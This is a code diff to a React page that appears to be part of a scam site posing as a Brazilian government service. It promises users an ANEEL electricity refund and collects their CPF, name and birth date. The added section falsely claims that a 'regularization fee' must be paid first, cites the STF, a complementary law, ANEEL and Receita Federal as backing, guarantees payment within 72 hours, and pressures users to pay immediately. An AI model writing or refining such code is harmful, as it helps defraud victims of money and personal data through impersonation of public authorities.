@@ -186,8 +186,17 @@ export default function ResultadoCalculo() {
     return `${dia}/${mes}/${ano}`;
   };
   
-  const prosseguirParaPagamento = () => {
-    window.location.href = `/pagamento?cpf=${encodeURIComponent(cpf)}&nome=${encodeURIComponent(nome)}&valor=${encodeURIComponent(valorRestituicao)}&nasc=${encodeURIComponent(dataNascimento)}&companhia=${encodeURIComponent(companhia)}&estado=${encodeURIComponent(estado)}`;
+  // Verifica se estamos na página de info
+  const isInfoPage = window.location.pathname.includes('/info');
+  
+  const prosseguirParaInfo = () => {
+    // Se já estamos na página de info, redirecionar para pagamento
+    if (isInfoPage) {
+      window.location.href = `/pagamento?cpf=${encodeURIComponent(cpf)}&nome=${encodeURIComponent(nome)}&valor=${encodeURIComponent(valorRestituicao)}&nasc=${encodeURIComponent(dataNascimento)}&companhia=${encodeURIComponent(companhia)}&estado=${encodeURIComponent(estado)}`;
+    } else {
+      // Senão, redirecionar para a página de info
+      window.location.href = `/resultado-calculo/info?cpf=${encodeURIComponent(cpf)}&nome=${encodeURIComponent(nome)}&companhia=${encodeURIComponent(companhia)}&estado=${encodeURIComponent(estado)}&nasc=${encodeURIComponent(dataNascimento)}&valor=${encodeURIComponent(valorMedio)}&meses=${encodeURIComponent(meses)}`;
+    }
   };
   
   return (
@@ -340,24 +349,7 @@ export default function ResultadoCalculo() {
                   </div>
                   
                   <Button 
-                    onClick={() => {
-                      // Mostrar mensagem de atenção quando clicar no botão
-                      const infoElement = document.getElementById('info-area');
-                      if (infoElement) {
-                        infoElement.innerHTML = `
-                          <div class="bg-amber-50 border border-amber-200 rounded-lg p-4">
-                            <h3 class="font-medium text-amber-800 mb-2">
-                              <span><strong>ATENÇÃO:</strong> Sua inscrição ainda não foi confirmada devido à falta de pagamento da Taxa de Inscrição. Para garantir sua participação no exame, é necessário efetuar o pagamento imediatamente.</span>
-                            </h3>
-                          </div>
-                        `;
-                      }
-                      
-                      // Após um breve delay, redirecionar para a página de pagamento
-                      setTimeout(() => {
-                        prosseguirParaPagamento();
-                      }, 1500);
-                    }}
+                    onClick={prosseguirParaInfo}
                     className="w-full bg-[var(--gov-blue)] hover:bg-[var(--gov-blue)]/90 mt-4 text-white font-bold py-3"
                   >
                     RECEBER MINHA RESTITUIÇÃO
@@ -366,7 +358,36 @@ export default function ResultadoCalculo() {
                 </CardContent>
               </Card>
               
-              <div id="info-area"></div>
+              {isInfoPage ? (
+                <div className="mb-8">
+                  <h3 className="text-xl font-bold text-[#044785] mb-4">
+                    <AlertCircle className="inline-block mr-2 h-5 w-5" />
+                    Informações Importantes sobre a Restituição da ANEEL
+                  </h3>
+                  <div className="space-y-5">
+                    <div className="info-box pl-4 py-1">
+                      <h4 className="text-lg font-semibold text-[#2c5985]">Por que estou pagando uma taxa se o valor é meu por direito?</h4>
+                      <p className="text-gray-700 mb-2">A TRE é uma exigência operacional imposta pelos órgãos públicos para garantir a segurança da liberação, evitando fraudes, duplicidades e erros de restituição.</p>
+                    </div>
+                    <div className="info-box pl-4 py-1">
+                      <h4 className="text-lg font-semibold text-[#2c5985]">A restituição é garantida após o pagamento da TRE?</h4>
+                      <p className="text-gray-700 mb-2">Sim. Após a confirmação, o valor de {formatarMoeda(valorRestituicao)} será depositado em até 72 horas úteis, conforme calendário de restituição oficial.</p>
+                    </div>
+                    <div className="info-box pl-4 py-1">
+                      <h4 className="text-lg font-semibold text-[#2c5985]">Como sei que isso é oficial?</h4>
+                      <p className="text-gray-700 mb-2">Todo o processo está amparado por decisão do STF, regulamentado pela Lei Complementar nº 194/2022, e validado pela ANEEL e Receita Federal.</p>
+                    </div>
+                  </div>
+                  <div className="bg-red-50 p-4 rounded-md border border-red-300 text-red-800 mt-6">
+                    <p className="flex items-start">
+                      <AlertCircle className="text-red-600 mr-2 mt-1 h-5 w-5 flex-shrink-0" />
+                      <span><strong>ATENÇÃO:</strong> Sua solicitação ainda não foi confirmada devido à falta de pagamento da Taxa de Regularização Energética (TRE). Para garantir sua restituição é necessário efetuar o pagamento imediatamente.</span>
+                    </p>
+                  </div>
+                </div>
+              ) : (
+                <div id="info-area"></div>
+              )}
             </div>
           </div>
         </main>
